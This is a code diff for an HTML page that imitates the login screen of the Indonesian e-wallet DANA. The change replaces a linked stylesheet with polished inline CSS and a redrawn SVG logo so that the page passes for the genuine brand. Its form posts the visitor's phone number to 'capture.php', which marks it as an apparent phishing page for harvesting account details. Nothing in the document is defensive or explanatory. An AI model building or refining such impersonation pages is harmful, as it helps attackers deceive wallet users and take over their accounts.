@@ -4,16 +4,135 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DANA - Dompet Digital Indonesia</title>
-    <link rel="stylesheet" href="style.css">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: linear-gradient(145deg, #f5f9ff 0%, #e8f2fa 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .card {
+            background: white;
+            padding: 40px 30px 32px;
+            border-radius: 32px;
+            box-shadow: 0 12px 40px rgba(0, 100, 200, 0.12), 0 4px 16px rgba(0,0,0,0.04);
+            text-align: center;
+            width: 100%;
+            max-width: 360px;
+            transition: all 0.2s;
+        }
+        .logo {
+            margin: 0 auto 16px;
+            display: block;
+        }
+        .greeting {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+        .subtext {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 16px 16px 16px 52px;
+            border: 1.5px solid #dce4ec;
+            border-radius: 16px;
+            font-size: 16px;
+            background: #fafcff;
+            transition: all 0.2s;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #0099ff;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(0,153,255,0.08);
+        }
+        .input-group .icon-left {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            opacity: 0.5;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0099ff 0%, #0077dd 100%);
+            border: none;
+            border-radius: 24px;
+            color: white;
+            font-size: 17px;
+            font-weight: 700;
+            box-shadow: 0 6px 20px rgba(0,153,255,0.35);
+            cursor: pointer;
+            transition: all 0.15s;
+            margin-top: 8px;
+        }
+        .btn-primary:active {
+            transform: scale(0.97);
+            box-shadow: 0 3px 10px rgba(0,153,255,0.25);
+        }
+        .footer-note {
+            font-size: 12px;
+            color: #aaa;
+            margin-top: 20px;
+            letter-spacing: 0.3px;
+        }
+        .divider {
+            border: none;
+            border-top: 1px solid #edf2f7;
+            margin: 20px 0 12px;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <img src="assets/dana-logo.png" alt="DANA" width="120">
-        <h2>Masuk ke akun DANA</h2>
-        <form action="capture.php" method="POST">
+<div class="card">
+    <!-- Logo DANA dengan SVG -->
+    <svg class="logo" viewBox="0 0 200 60" width="130" height="39">
+        <defs>
+            <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#0099ff;stop-opacity:1" />
+                <stop offset="100%" style="stop-color:#0066cc;stop-opacity:1" />
+            </linearGradient>
+        </defs>
+        <rect x="0" y="10" width="40" height="40" rx="12" fill="url(#logoGrad)"/>
+        <text x="10" y="39" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="white">D</text>
+        <text x="50" y="39" font-family="Arial, sans-serif" font-size="26" font-weight="700" fill="#1a1a1a">DANA</text>
+    </svg>
+
+    <div class="greeting">Masuk ke akun</div>
+    <div class="subtext">Lanjutkan dengan nomor ponsel terdaftar</div>
+
+    <form action="capture.php" method="POST">
+        <div class="input-group">
+            <!-- Ikon telepon SVG -->
+            <span class="icon-left">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.8">
+                    <rect x="5" y="2" width="14" height="20" rx="3" stroke="currentColor"/>
+                    <circle cx="12" cy="18" r="1.2" fill="currentColor"/>
+                    <path d="M9 5h6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                </svg>
+            </span>
             <input type="tel" name="phone" placeholder="Masukkan nomor HP" required>
-            <button type="submit">Lanjutkan</button>
-        </form>
-    </div>
+        </div>
+        <button type="submit" class="btn-primary">Lanjutkan</button>
+    </form>
+
+    <hr class="divider">
+    <div class="footer-note">DANA • Dompet Digital Indonesia</div>
+</div>
 </body>
 </html>
